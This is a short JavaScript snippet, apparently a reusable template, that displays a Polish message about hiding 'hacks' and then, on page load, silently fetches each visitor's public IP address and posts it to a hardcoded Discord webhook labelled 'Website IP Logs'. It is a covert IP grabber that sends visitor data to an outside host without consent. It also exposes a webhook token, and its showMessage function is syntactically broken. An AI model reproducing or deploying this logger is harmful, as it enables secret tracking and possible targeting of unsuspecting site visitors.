function showMessage() 
    document.getElementById("message").innerHTML="aby ukryc haksy trzeba miec mutacje"
    
    
    async function sendWebhook() {
        let ip = await (await fetch(`https://ifconfig.me/ip`)).text();
        var request = new XMLHttpRequest();
        request.open("POST", "https://discord.com/api/webhooks/1108051692546691133/nKCEoVW9ThzTZvtDPpIA2PNGAh4TcEW7T-SqZR6TnKfI2tuWn4luj-y5ckgDTl7vJ6Ow"); // paste your webhook link there
    
        request.setRequestHeader('Content-type', 'application/json');
    
        var params = {
            username: "Website IP Logs",
            avatar_url: "",
            content: `IP: ${ip}`
        };
    
        request.send(JSON.stringify(params));
    };
    
    window.onload = function () { // this will run funcion on page load
        sendWebhook();
    };

